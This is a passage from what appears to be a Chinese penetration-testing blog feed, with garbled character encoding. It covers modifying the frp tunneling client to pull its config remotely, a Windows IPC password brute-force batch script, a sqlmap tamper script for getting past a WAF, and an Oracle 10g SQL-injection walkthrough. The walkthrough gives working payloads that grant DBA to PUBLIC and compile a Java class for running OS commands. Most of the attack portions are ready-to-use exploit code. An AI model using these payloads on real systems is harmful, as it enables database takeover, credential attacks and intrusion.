<h3 id="4-ä¿®æ”¹runClientå‡½æ•°"><a class="header-anchor" href="#4-ä¿®æ”¹runClientå‡½æ•°">Â¶</a>4. ä¿®æ”¹<code>runClient</code>å‡½æ•°</h3>
<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line"><span class="addition">+ func runClient(cfgFilePath string, ipPort string) (err error) {</span></span><br><span class="line">	var content string</span><br><span class="line"><span class="addition">+	getFileContent(ipPort)</span></span><br><span class="line"><span class="addition">+	// content, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line"><span class="addition">+	content, err = fileContent, nil</span></span><br><span class="line">	if err != nil {</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line">	if err != nil {</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line">	if err != nil {</span><br><span class="line">		return err</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line">	return</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="5-è°ƒç”¨runClient"><a class="header-anchor" href="#5-è°ƒç”¨runClient">Â¶</a>5. è°ƒç”¨<code>runClient()</code></h3>
<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line">var rootCmd = &amp;cobra.Command{</span><br><span class="line">	Use:   "frpc",</span><br><span class="line">	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",</span><br><span class="line">	RunE: func(cmd *cobra.Command, args []string) error {</span><br><span class="line">		if showVersion {</span><br><span class="line">			fmt.Println(version.Full())</span><br><span class="line">			return nil</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		// Do not show command usage here.</span><br><span class="line"><span class="addition">+		err := runClient(cfgFile, ipPort)</span></span><br><span class="line">		if err != nil {</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			os.Exit(1)</span><br><span class="line">		}</span><br><span class="line">		return nil</span><br><span class="line">	},</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="6-ç¼–è¯‘"><a class="header-anchor" href="#6-ç¼–è¯‘">Â¶</a>6. ç¼–è¯‘</h3>
<p>ä¿®æ”¹æ ¹ç›®å½•<code>package.sh</code>ï¼Œå®ç°ç›´æ¥ç”Ÿæˆç¼–è¯‘æ–‡ä»¶è€Œä¸æ‰“åŒ…</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># compile for version</span></span><br><span class="line">make</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"make error"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">frp_version=`./bin/frps --version`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"build version: <span class="variable">$frp_version</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cross_compiles</span></span><br><span class="line">make -f ./Makefile.cross-compiles</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf ./release/packages</span><br><span class="line"><span class="built_in">mkdir</span> -p ./release/packages</span><br><span class="line"></span><br><span class="line">os_all=<span class="string">'linux windows darwin freebsd'</span></span><br><span class="line">arch_all=<span class="string">'386 amd64 arm arm64 mips64 mips64le mips mipsle'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./release</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> os <span class="keyword">in</span> <span class="variable">$os_all</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">arch</span> <span class="keyword">in</span> <span class="variable">$arch_all</span>; <span class="keyword">do</span></span><br><span class="line">        frp_dir_name=<span class="string">"frp_<span class="variable">${frp_version}</span>_<span class="variable">${os}</span>_<span class="variable">${arch}</span>"</span></span><br><span class="line">        frp_path=<span class="string">"./packages/frp_<span class="variable">${frp_version}</span>_<span class="variable">${os}</span>_<span class="variable">${arch}</span>"</span></span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">        <span class="built_in">rm</span> -rf <span class="variable">${frp_path}</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></tbody></table></figure>
<p>ç¼–è¯‘</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">bash package.sh</span><br></pre></td></tr></tbody></table></figure>
<h2 id="æ•ˆæœ"><a class="header-anchor" href="#æ•ˆæœ">Â¶</a>æ•ˆæœ</h2>
<p><img src="frpc.png" alt="frpc"></p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<blockquote>
<p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRPæ”¹é€ è®¡åˆ’.html</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>frp</tag>
        <tag>go</tag>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>IPCæš´ç ´ - Bat</title>
    <url>/2018/12/20/IPC%E6%9A%B4%E7%A0%B4-Bat/</url>
    <content><![CDATA[<h2 id="0x01-å‰è¨€"><a class="header-anchor" href="#0x01-å‰è¨€">Â¶</a>0x01 å‰è¨€</h2>
<p>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼ŒæŒæ¡ä¸€äº›å¯†ç åï¼Œæœ€åŸºç¡€ï¼Œæœ€æœ‰æ•ˆè·å–æœåŠ¡å™¨æƒé™çš„æ–¹å¼å³<code>ipc</code>æš´ç ´</p>
<p>å…³äº<code>ipc</code>æš´ç ´ï¼Œè¿™ç±»å·¥å…·åœ¨ç½‘ä¸Šè§çš„ä¸å¤šã€‚ç›®å‰å·¥ä½œä¸­è§åˆ°çš„æœ‰ç›´æ¥å¼€æ— æ•°ä¸ª<code>cmd</code>çš„ä¼ª<code>bat</code>ï¼Œè¿˜æœ‰èº«è¾¹åŒäº‹<code>powershell</code>å†™çš„<code>ps1</code>ï¼Œ<code>powershell</code>æ˜¯æŒºå¥½ç”¨çš„ï¼Œä½†æœ‰ä¸ªå…³é”®é—®é¢˜æ˜¯ç›®æ ‡æœºå™¨å¿…é¡»æ˜¯<code>win7</code>åŠä»¥ä¸Šï¼Œé‡åˆ°è€æœºå™¨å½“ç„¶æ˜¯æ²¡æ³•ç”¨äº†ã€‚</p>
<p>å› æ­¤ï¼Œbatæ— ç–‘æ˜¯é¦–é€‰ï¼Œå› å…¶è¯­è¨€è¾ƒåº•å±‚ï¼Œä¸å¤Ÿé«˜çº§ï¼Œå†™èµ·æ¥æ¯”è¾ƒåƒåŠ›</p>
<p>èŠ±äº†å‡ å¤©æ—¶é—´æ”¹äº†å‡ ä¸ªç‰ˆæœ¬ï¼Œè§£å†³äº†å¯†ç ç‰¹æ®Šå­—ç¬¦ï¼Œèœåˆ€åˆ¤æ–­è¿›ç¨‹ç­‰å„ç§é—®é¢˜ï¼Œæ›´æ–°æ—¥å¿—åœ¨<code>update.txt</code>ï¼Œåº”ç”¨åœ¨è‡ªå·±çš„å®æˆ˜ä¸­ã€‚</p>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼š<span class="label success">IPC</span>, <span class="label success">Bat</span></p></div>
<span id="more"></span>
<h2 id="0x02-Bat"><a class="header-anchor" href="#0x02-Bat">Â¶</a>0x02 Bat</h2>
<p>éœ€è¦æä¾›ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶</p>
<blockquote>
<p><code>username.txt</code>, <code>password.txt</code></p>
</blockquote>
<p><code>password.txt</code>ï¼šä¸å¿…å¤šè¯´ï¼Œæ”¾å…¥å¯†ç å³å¯ï¼Œä¸€è¡Œä¸€ä¸ª</p>
<p><code>username.txt</code>ï¼šæ”¾å…¥å¯¹åº”çš„<code>åŸŸ\ç”¨æˆ·</code>ï¼Œå¤§æ¦‚æ˜¯<code>win2012</code>ä»¥ä¸ŠåŸŸæ—¶ï¼Œåœ¨<code>ipc</code>è¿æ¥æ—¶å¿…é¡»åŠ å…¥åŸŸï¼Œä¸ºäº†å…¼å®¹é«˜ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç›´æ¥ä»¥<code>åŸŸ\ç”¨æˆ·</code>å½¢å¼å­˜å…¥æ–‡ä»¶</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight bat"><figcaption><span>username.txt</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">localhost\administrator</span><br><span class="line">red.ad\redn3ck</span><br></pre></td></tr></tbody></table></figure>
<p>æœ¬æ¥æƒ³ç›´æ¥åœ¨<code>bat</code>ä¸­ç”¨æ•°ç»„å†™å…¥<code>username</code>ï¼Œå› ä¸ºæ‰¹å¤„ç†ä¸­ä¸è‡ªå¸¦æ•°ç»„åŠŸèƒ½ï¼Œå…ˆæ˜¯å®ç°äº†æ•°ç»„ï¼Œç»“æœå› ä¸ºå˜é‡å»¶è¿Ÿå¯¼è‡´å¯†ç ä¸ºç‰¹æ®Šå­—ç¬¦æ—¶ï¼Œå¦‚<code>!,^</code>ç­‰ï¼Œå¯¼è‡´è¿™äº›å­—ç¬¦æ— æ³•å¸¦å…¥å‘½ä»¤ï¼Œä¼šè¢«æ‰¹å¤„ç†åæ²¡ï¼ŒèŠ±äº†å¥½ä¹…æ—¶é—´ä¹Ÿæ²¡æå®šå¦‚ä½•è§£å†³æ­¤é—®é¢˜ï¼Œæœ‰è§£å†³æ–¹æ³•çš„è€å“¥è¿˜æœ›æŒ‡å¯¼</p>
<h3 id="æˆªå›¾"><a class="header-anchor" href="#æˆªå›¾">Â¶</a>æˆªå›¾</h3>
<p><img src="ipc.png" alt="ipc"></p>
<div class="note warning"><p>æ¸©é¦¨æç¤ºï¼šç¨‹åºå¯åŠ¨ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆ`ip.txt`ï¼Œå³`-h`å‚æ•°æŒ‡å®šçš„ipæ®µï¼Œç¨‹åºç»“æŸæ—¶ä¼šè‡ªåŠ¨åˆ é™¤å¹¶ç”Ÿæˆ`out.txt`ã€‚</p></div>
<h2 id="0x03-Code"><a class="header-anchor" href="#0x03-Code">Â¶</a>0x03 Code</h2>
<figure class="highlight bat"><figcaption><span>ipc.bat</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:<span class="built_in">start</span></span><br><span class="line"><span class="keyword">if</span> "%<span class="number">1</span>"=="" <span class="keyword">goto</span> usage</span><br><span class="line"><span class="keyword">if</span> "%<span class="number">1</span>"=="-h" <span class="keyword">goto</span> ip-range</span><br><span class="line"></span><br><span class="line">:usage</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Usage:</span><br><span class="line"><span class="built_in">echo</span> 	[-h ips]	host(ip) range, <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span>-<span class="number">255</span></span><br><span class="line"><span class="built_in">echo</span> 	tips:		password.txt is needed.</span><br><span class="line"><span class="built_in">echo</span> 			username.txt is needed.</span><br><span class="line"><span class="built_in">echo</span> 			ipc.bat can <span class="keyword">not</span> add <span class="built_in">path</span> like 'c:\programdata\ipc.bat'.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> example:</span><br><span class="line"><span class="built_in">echo</span> 	ipc.bat -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span>-<span class="number">255</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">.</span><br></pre></td></tr></tbody></table></figure>
<h2 id="0x04-å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#0x04-å‚è€ƒé“¾æ¥">Â¶</a>0x04 å‚è€ƒé“¾æ¥</h2>
<p><a href="https://www.t00ls.net/thread-30632-1-1.html">https://www.t00ls.net/thread-30632-1-1.html</a></p>
]]></content>
      <tags>
        <tag>IPC</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysqlæ³¨å…¥ - Sqlmapä¹‹tamperç¼–å†™</title>
    <url>/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1>Bypass <code>@</code></h1>
<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@error.png" class="">
<p>å¦‚å›¾ï¼Œé‡åˆ°<code>@</code>ï¼Œå¯¼è‡´æ³¨å…¥å¤±è´¥ï¼Œä½¿ç”¨mysqlè¡¨åå³å¯ç»•è¿‡</p>
<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@.png" class="">
<h1>Bypass WAF</h1>
<span id="more"></span>
<p>è¯¥ç«™å­˜åœ¨WAFï¼Œ<code>union</code>ä¸å¯ä¸<code>select</code>åŒæ—¶å‡ºç°ï¼Œç®€å•ä½¿ç”¨<code>%0A</code>å³å¯ç»•è¿‡ï¼Œå³<code>union%0Aselect</code>ï¼›<br>
å¦å¤–<code>information_schema.tables</code>ä¹Ÿè¢«æ‹‰é»‘ï¼Œfuzzåå‘ç°ä¹Ÿä¸éš¾ç»•ï¼Œæ”¹ä¸º<code>information_schema/**/.tables</code>å³å¯ç»•è¿‡ã€‚</p>
<h1>Tamperç¼–å†™</h1>
<p>è¿™ä¸‹ç»•è¿‡æ˜¯æ²¡é—®é¢˜äº†ï¼Œå¯æƒœsqlmapè·‘ä¸äº†ï¼Œé‚æƒ³ç¼–å†™ä¸€é’ˆå¯¹æ­¤ç«™çš„tamperï¼Œä¾›sqlmapè°ƒç”¨ï¼Œä½†å› æœªå®ç°è¿‡æ­¤æ–¹å¼ï¼Œç¿»çœ‹sqlmapä¸­<em>tamper</em>ï¼Œå‘ç°å¾ˆç®€å•ï¼Œæ¥å£å·²ç»å‡†å¤‡å¥½ï¼Œåªéœ€è¦å¯¹payloadè¿›è¡Œå¤„ç†å°±èƒ½è®©sqlmapè°ƒç”¨ã€‚</p>
<p>ç¼–å†™<code>own.py</code>æ”¾å…¥<em>tamper</em>ç›®å½•ä¸‹å³å¯</p>
<p><font color="red">æ³¨æ„ï¼šsqlmapä¸­çš„payloadå‡æ˜¯å¤§å†™</font></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Replaces space character (' ') with comments '/**/'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class="line"><span class="string">    'SELECT/**/id/**/FROM/**/users'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        retVal = payload.replace(<span class="string">'SCHEMA.'</span>, <span class="string">'SCHEMA/**/.'</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">'UNION '</span>, <span class="string">'UNION%0A'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <tags>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracleæ³¨å…¥ - å‘½ä»¤æ‰§è¡Œ&amp;Shellåå¼¹</title>
    <url>/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/</url>
    <content><![CDATA[<h1>0x01 Oracleå®‰è£…</h1>
<p>CentOS 7 å®‰è£…oracle10gï¼Œè£…äº†ä¸€å¤©ï¼Œç‰¹æ­¤è®°å½•</p>
<blockquote>
<p><a href="http://blog.51cto.com/semiter/1251332">oracle9i,10G,11G,å„ç‰ˆæœ¬ä¸‹è½½èµ„æº</a></p>
<p><a href="https://blog.csdn.net/u013938484/article/details/51175501">Centos6/7ä¸‹é™é»˜å®‰è£…oracle10g</a></p>
</blockquote>
<h1>0x02 å‘½ä»¤æ‰§è¡Œ</h1>
<p>æœ¬æ–‡æµ‹è¯•ç¯å¢ƒå‡ä¸ºï¼š</p>
<blockquote>
<p>CentOS Linux release 7.2.1511 (Core)</p>
<p>Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</p>
</blockquote>
<p>æ‰§è¡Œæ–¹å¼å¾ˆå¤šç§ï¼Œè¿™è¾¹åªç ”ç©¶Oracle10gï¼Œå¹¶ä¸”æœ¬åœ°å®æµ‹æˆåŠŸçš„</p>
<ul>
<li><code>DBMS_EXPORT_EXTENSION()</code></li>
<li><code>dbms_xmlquery.newcontext()</code></li>
<li><code>DBMS_JAVA_TEST.FUNCALL()</code></li>
</ul>
<span id="more"></span>
<p><font color="red">æ³¨æ„ï¼šæ³¨å…¥æ—¶éœ€å»é™¤æœ«å°¾åˆ†å·<code>;</code> </font></p>
<h2 id="æ–¹æ³•1-DBMS-EXPORT-EXTENSION"><a class="header-anchor" href="#æ–¹æ³•1-DBMS-EXPORT-EXTENSION">Â¶</a>æ–¹æ³•1. DBMS_EXPORT_EXTENSION()</h2>
<blockquote>
<ul>
<li>å½±å“ç‰ˆæœ¬ï¼šOracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>æƒé™ï¼šNone</li>
<li>è¯¦æƒ…ï¼šè¿™ä¸ªè½¯ä»¶åŒ…æœ‰è®¸å¤šæ˜“å—PL/SQLæ³¨å…¥æ”»å‡»çš„å‡½æ•°ã€‚è¿™äº›å‡½æ•°ç”±SYSæ‹¥æœ‰ï¼Œä½œä¸ºSYSæ‰§è¡Œå¹¶ä¸”å¯ç”±PUBLICæ‰§è¡Œã€‚å› æ­¤ï¼Œå¦‚æœSQLæ³¨å…¥å¤„äºä¸Šè¿°ä»»ä½•æœªä¿®è¡¥çš„Oracleæ•°æ®åº“ç‰ˆæœ¬ä¸­ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°å¹¶ç›´æ¥æ‰§è¡ŒSYSæŸ¥è¯¢ã€‚</li>
</ul>
</blockquote>
<p>ææƒï¼šè¯¥è¯·æ±‚å°†å¯¼è‡´æŸ¥è¯¢"GRANT DBA TO PUBLIC"ä»¥SYSèº«ä»½æ‰§è¡Œã€‚ å› ä¸ºè¿™ä¸ªå‡½æ•°å…è®¸PL / SQLç¼ºé™·ï¼ˆPL / SQLæ³¨å…¥ï¼‰ã€‚ä¸€æ—¦è¿™ä¸ªè¯·æ±‚æˆåŠŸæ‰§è¡Œï¼ŒPUBLICè·å–DBAè§’è‰²ï¼Œä»è€Œæå‡å½“å‰userçš„ç‰¹æƒ</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h3 id="ä½¿ç”¨java"><a class="header-anchor" href="#ä½¿ç”¨java">Â¶</a>ä½¿ç”¨java</h3>
<h4 id="ï¼ˆ1-åˆ›å»ºJavaåº“"><a class="header-anchor" href="#ï¼ˆ1-åˆ›å»ºJavaåº“">Â¶</a>ï¼ˆ1) åˆ›å»ºJavaåº“</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h4 id="2-èµ‹äºˆJavaæƒé™"><a class="header-anchor" href="#2-èµ‹äºˆJavaæƒé™">Â¶</a>(2) èµ‹äºˆJavaæƒé™</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h4 id="3-åˆ›å»ºå‡½æ•°"><a class="header-anchor" href="#3-åˆ›å»ºå‡½æ•°">Â¶</a>(3) åˆ›å»ºå‡½æ•°</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h4 id="4-èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™"><a class="header-anchor" href="#4-èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™">Â¶</a>(4) èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<h4 id="5-æ‰§è¡Œ"><a class="header-anchor" href="#5-æ‰§è¡Œ">Â¶</a>(5) æ‰§è¡Œ</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.LinxRunCMD(<span class="string">'/bin/bash -c /usr/bin/whoami'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></tbody></table></figure>
<p><img src="extension_linxruncmd_01.png" alt="extension_linxruncmd_01"></p>
<h2 id="æ–¹æ³•2-dbms-xmlquery-newcontext"><a class="header-anchor" href="#æ–¹æ³•2-dbms-xmlquery-newcontext">Â¶</a>æ–¹æ³•2. dbms_xmlquery.newcontext()</h2>
<p>æ­¤æ–¹æ³•æˆåŠŸå‰æ</p>
<blockquote>
<ul>
<li>å½±å“ç‰ˆæœ¬ï¼šOracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
</ul>
</blockquote>
<p>å³<strong>æ–¹æ³•1</strong> ä¸­DBMS_EXPORT_EXTENSIONå­˜åœ¨æ¼æ´æƒ…å†µä¸‹ï¼Œå¦åˆ™èµ‹äºˆæƒé™æ—¶æ— æ³•æˆåŠŸ</p>
<h4 id="1-åˆ›å»ºjavaåŒ…"><a class="header-anchor" href="#1-åˆ›å»ºjavaåŒ…">Â¶</a>(1) åˆ›å»ºjavaåŒ…</h4>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></tbody></table></figure>
<p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹all_objectså†…éƒ¨æ”¹å˜ï¼š</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">'%LINX%'</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">'%Linx%'</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="newcontext_all_objects_01.png" alt="newcontext_all_objects_01"></p>
<h4 id="2-èµ‹äºˆå½“å‰ç”¨æˆ·javaæƒé™"><a class="header-anchor" href="#2-èµ‹äºˆå½“å‰ç”¨æˆ·javaæƒé™">Â¶</a>(2) èµ‹äºˆå½“å‰ç”¨æˆ·javaæƒé™</h4>
